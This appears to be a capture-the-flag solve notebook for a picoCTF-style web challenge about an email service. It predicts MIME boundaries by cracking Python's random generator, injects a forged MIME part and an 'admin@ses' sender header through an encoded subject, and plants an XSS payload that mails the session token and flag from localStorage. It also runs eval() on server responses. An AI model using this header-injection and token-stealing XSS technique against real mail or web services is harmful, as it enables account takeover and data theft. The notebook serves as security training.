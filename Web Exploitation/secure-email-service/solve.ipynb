{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from randcrack import RandCrack\n",
    "import random\n",
    "import sys\n",
    "import json\n",
    "from tqdm import tqdm\n",
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# server_url = 'http://activist-birds.picoctf.net:51901'\n",
    "server_url = 'http://0.0.0.0:8000'\n",
    "password = password if \"password\" in locals() else eval(requests.get(server_url + '/api/password').text)\n",
    "token = eval(requests.post(server_url + '/api/login', json={'username': 'user@ses', 'password': password}).text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send(to, subject, body):\n",
    "    res = requests.post(server_url + '/api/send', json={'to': to, 'subject': subject, 'body': body}, headers={'token': token})\n",
    "    return json.loads(res.text)\n",
    "\n",
    "def email(id):\n",
    "    res = requests.get(server_url + f'/api/email/{id}', headers={'token': token})\n",
    "    return json.loads(res.text)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def split_long(rng):\n",
    "    m = []\n",
    "    for i in rng:\n",
    "        m.append(i % 2**32)\n",
    "        m.append((i >> 32) * 2)\n",
    "    return m\n",
    "\n",
    "def crack(m):\n",
    "    for i in tqdm(range(0, 396, 2)):\n",
    "        if i < 624-397: # corrects odd values from 1-227 and 397-623\n",
    "            for b in range(4):\n",
    "                m[i+1] = (m[i+1] // 2) * 2 + b % 2\n",
    "                m[i+397] = (m[i+397] // 2) * 2 + b // 2\n",
    "\n",
    "                rc = RandCrack()\n",
    "                for x in m[:624]: rc.submit(x)\n",
    "                rc.offset(i)\n",
    "                if (rc.predict_getrandbits(32) == m[i+624]): break\n",
    "            else: raise Exception()\n",
    "        else: # corrects odd values from 229 to 395\n",
    "            # we only have to check 2 values now because\n",
    "            # i+397 wraps around to a number we have solved for already\n",
    "            for b in range(2):\n",
    "                m[i+1] = (m[i+1] // 2) * 2 + b % 2\n",
    "\n",
    "                rc = RandCrack()\n",
    "                for x in m[:624]: rc.submit(x)\n",
    "                rc.offset(i)\n",
    "                if rc.predict_getrandbits(32) == m[i+624]: break\n",
    "            else: raise Exception\n",
    "\n",
    "    rc = RandCrack()\n",
    "    for x in m[:624]: rc.submit(x)\n",
    "    rc.offset(510 * 2 - 624)\n",
    "\n",
    "    return rc\n",
    "\n",
    "def crackalack():\n",
    "    print('Collecting emails...')\n",
    "    rng = []\n",
    "    for i in tqdm(range(510)):\n",
    "        id = send('user@ses', '', '')\n",
    "        data = email(id)\n",
    "        boundary = int(data['data'].split('=')[16])\n",
    "        rng.append(boundary)\n",
    "    \n",
    "    print('Cracking...')\n",
    "    rc = crack(split_long(rng))\n",
    "\n",
    "    def generator():\n",
    "        while True:\n",
    "            yield rc.predict_randrange(sys.maxsize)\n",
    "\n",
    "    return generator()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "next(boundary_gen)\n",
    "boundary = f'--==============={next(boundary_gen)}=='\n",
    "\n",
    "xss = '''<img src=x onerror=\"fetch('/api/send', {method: 'POST',body: JSON.stringify({ to: 'user@ses', body: localStorage.getItem('flag'), subject: localStorage.getItem('flag') }),headers: {'Content-Type':'application/json','token': localStorage.getItem('token')}})\">'''.encode()\n",
    "\n",
    "subject = f'''{boundary}\n",
    " Content-Type: text/html\n",
    "d{boundary}\n",
    " Content-Transfer-Encoding: base64\n",
    "\n",
    "{base64.b64encode(xss).decode()}{boundary}\n",
    "'''.encode()\n",
    "\n",
    "payload = f\"\"\"=?UTF-8?B?{base64.b64encode(subject).decode()}?=\n",
    "orz\n",
    " From: admin@ses\n",
    "\"\"\"\n",
    "\n",
    "send('admin@ses', payload, 'PLSPLSPLSPLSPLS')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "requests.post(server_url + '/api/admin_bot', headers={'token': token})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "requests.post(server_url + '/api/admin_bot', headers={'token': token})"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ctf",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
